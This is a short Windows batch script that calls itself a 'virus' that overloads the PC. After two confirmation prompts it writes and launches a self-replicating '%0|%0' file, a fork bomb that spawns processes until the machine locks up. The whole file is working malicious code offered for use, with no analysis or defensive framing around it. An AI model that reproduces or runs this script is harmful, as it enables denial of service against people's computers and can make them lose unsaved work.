@echo off
color a
setlocal
cls
echo.
echo.
echo WARNING!
echo THIS VIRUS OVERLOADS YOUR PC, DO YOU WANT TO RUN IT?
echo.
set /p continue="[YES / NO] >> "
if /i "%continue%"=="yes" goto run
if /i "%continue%"=="y" ( goto run ) else ( exit )
:run
cls
echo.
echo.
echo LAST WARNING!
echo PRESS ANY KEY TO RUN AND SAY BYE BYE...
pause >nul
del xwkqelajcmLsldi.bat >nul
echo %%0^|%%0 > xwkqelajcmLsldi.bat
.\xwkqelajcmLsldi.bat >nul
